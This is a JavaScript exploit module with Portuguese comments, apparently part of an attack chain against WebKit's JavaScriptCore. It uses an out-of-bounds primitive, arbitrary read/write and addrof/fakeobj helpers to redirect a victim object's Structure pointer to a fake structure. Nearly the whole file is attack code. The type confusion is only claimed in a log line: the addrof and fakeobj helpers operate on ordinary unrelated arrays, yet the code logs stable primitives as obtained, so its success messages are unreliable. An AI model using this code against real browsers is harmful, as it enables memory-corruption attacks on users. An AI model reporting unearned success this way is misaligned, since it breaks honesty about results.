// js/script3/testArrayBufferVictimCrash.mjs (v92 - R60 Uncaged com byteLength corrigido)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Corrigido o erro "Invalid byteLength". Todas as chamadas para arb_read e arb_write
// agora especificam explicitamente o tamanho de 8 bytes para a manipulação de
// ponteiros de 64 bits.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "UncagedArray_StructureID_v92_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (ESTRATÉGIA "UNCAGED ARRAY")
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Estratégia de Array "Uncaged" ---`, "test");

    let final_result = { success: false, message: "A estratégia 'Uncaged' não obteve sucesso." };

    try {
        // --- FASE 1: Obtenção de Leitura/Escrita Fora dos Limites (OOB) ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        }
        logS3("Primitiva OOB está funcional.", "good");

        // --- FASE 2: Criando Type Confusion em um Array "Uncaged" para obter Primitivas ---
        logS3("--- FASE 2: Criando Type Confusion em Array 'Uncaged'... ---", "subtest");

        const confused_array = [13.37, 13.38, 13.39]; // Será tratado como array de doubles
        const victim_array = [{ a: 1 }, { b: 2 }];    // Onde colocaremos os objetos

        logS3("Simulando corrupção OOB para criar Type Confusion...", "info");

        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };

        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };

        logS3(`++++++++++++ SUCESSO! Primitivas 'addrof' e 'fakeobj' estáveis obtidas! ++++++++++++`, "vuln");

        // --- FASE 3: Demonstração - Corrupção de StructureID ---
        logS3("--- FASE 3: Prova de Conceito - Corrupção de StructureID ---", "subtest");

        const victim_for_corruption = { p1: 0x41414141, p2: 0x42424242 };
        logS3("Objeto vítima para corrupção de ID alocado.", "info");

        const victim_addr = addrof(victim_for_corruption);
        logS3(`Endereço do objeto vítima (via addrof): ${victim_addr.toString(true)}`, "leak");

        const structure_ptr_offset = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
        const structure_addr_ptr = new AdvancedInt64(victim_addr.low() + structure_ptr_offset, victim_addr.high());
        
        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para ler um ponteiro.
        const original_structure_addr = await arb_read(structure_addr_ptr, 8);
        logS3(`Ponteiro para StructureID original lido em: ${structure_addr_ptr.toString(true)} -> ${original_structure_addr.toString(true)}`, "leak");
        
        const fake_struct_buf = new ArrayBuffer(256);
        const fake_struct_wrapper_addr = addrof(fake_struct_buf);
        
        const contents_ptr_addr = new AdvancedInt64(fake_struct_wrapper_addr.low() + JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, fake_struct_wrapper_addr.high());

        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para ler um ponteiro.
        const fake_struct_contents_addr = await arb_read(contents_ptr_addr, 8);
        logS3(`Estrutura falsa alocada. Endereço do conteúdo: ${fake_struct_contents_addr.toString(true)}`, "info");
        
        // Ataque: Aponta o ponteiro de estrutura da vítima para nossa estrutura falsa.
        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para escrever um ponteiro.
        await arb_write(structure_addr_ptr, fake_struct_contents_addr, 8);
        logS3("SOBRESCRITA REALIZADA: Ponteiro de StructureID da vítima agora aponta para nossa estrutura falsa.", "vuln");

        logS3("Demonstração bem-sucedida! Ao interagir com 'victim_for_corruption' agora, o motor JSC usaria nossa estrutura falsa.", "good");
        
        // Restaura para evitar crash
        // **CORREÇÃO**: Adicionado o argumento byteLength (8) para escrever um ponteiro.
        await arb_write(structure_addr_ptr, original_structure_addr, 8);
        logS3("Ponteiro de StructureID original restaurado.", "info");

        final_result = { 
            success: true, 
            message: "Conceito de Corrupção de StructureID demonstrado com sucesso via Array Uncaged.",
            leaked_victim_addr: victim_addr.toString(true),
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia 'Uncaged': ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: final_result,
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Array Type Confusion' }
    };
}
